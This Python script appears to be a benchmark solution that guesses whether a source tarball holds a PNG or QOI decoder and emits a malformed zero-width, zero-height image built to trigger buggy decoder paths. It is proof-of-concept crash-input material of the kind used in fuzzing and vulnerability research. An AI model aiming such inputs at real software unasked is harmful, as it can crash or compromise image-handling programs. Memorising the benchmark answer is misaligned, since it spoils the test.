import struct
import zlib
import binascii
import tarfile


def _crc32(data: bytes) -> int:
    return binascii.crc32(data) & 0xffffffff


def _png_chunk(typ: bytes, data: bytes) -> bytes:
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", _crc32(typ + data))
    return length + typ + data + crc


def make_png_zero_wh() -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    # IHDR: width=0, height=0, bit depth=8, color type=0 (grayscale), compression=0, filter=0, interlace=0
    ihdr_data = b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + bytes([8, 0, 0, 0, 0])
    ihdr = _png_chunk(b'IHDR', ihdr_data)
    # Create a compressed IDAT payload that expands to a number of filter bytes (each row has only filter byte when width=0)
    # Use multiple rows worth to increase chance of triggering buggy paths.
    decompressed = b"\x00" * 4096  # 4096 zero filter bytes (rows)
    idat_data = zlib.compress(decompressed, level=9)
    idat = _png_chunk(b'IDAT', idat_data)
    iend = _png_chunk(b'IEND', b'')
    return sig + ihdr + idat + iend


def make_qoi_zero_wh() -> bytes:
    # QOI header: magic 'qoif', width 0, height 0 (big-endian), channels=3, colorspace=0
    header = b'qoif' + struct.pack(">I", 0) + struct.pack(">I", 0) + bytes([3, 0])
    # End marker: 7 zero bytes + 0x01
    end_marker = b'\x00' * 7 + b'\x01'
    return header + end_marker


def detect_format_from_tar(src_path: str) -> str:
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            names = []
            for m in tf.getmembers():
                if m.isfile():
                    n = m.name.lower()
                    names.append(n)
            text = "\n".join(names)

            # Scores for formats
            scores = {
                'qoi': 0,
                'png': 0,
                'gif': 0,
                'jpeg': 0,
                'bmp': 0,
                'tiff': 0,
                'pnm': 0,
                'webp': 0,
            }

            # Heuristics based on filenames
            if 'qoi' in text:
                scores['qoi'] += text.count('qoi')
            png_keywords = ['png', 'libpng', 'spng', 'lodepng', 'apng']
            for kw in png_keywords:
                if kw in text:
                    scores['png'] += text.count(kw)

            # Other formats (fallbacks, lower priority)
            for kw in ['gif', 'giflib']:
                if kw in text:
                    scores['gif'] += text.count(kw)
            for kw in ['jpeg', 'libjpeg', 'jpg', 'mozjpeg', 'turbojpeg']:
                if kw in text:
                    scores['jpeg'] += text.count(kw)
            for kw in ['bmp', 'bitmap']:
                if kw in text:
                    scores['bmp'] += text.count(kw)
            for kw in ['tiff', 'libtiff']:
                if kw in text:
                    scores['tiff'] += text.count(kw)
            for kw in ['pnm', 'ppm', 'pgm', 'pbm']:
                if kw in text:
                    scores['pnm'] += text.count(kw)
            for kw in ['webp', 'libwebp']:
                if kw in text:
                    scores['webp'] += text.count(kw)

            # Choose the most likely format
            # Priority: qoi > png > others (others not implemented; fallback to png)
            if scores['qoi'] > 0 and scores['qoi'] >= scores['png']:
                return 'qoi'
            if scores['png'] > 0:
                return 'png'
            # Fallback
            return 'png'
    except Exception:
        return 'png'


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = detect_format_from_tar(src_path)
        if fmt == 'qoi':
            return make_qoi_zero_wh()
        return make_png_zero_wh()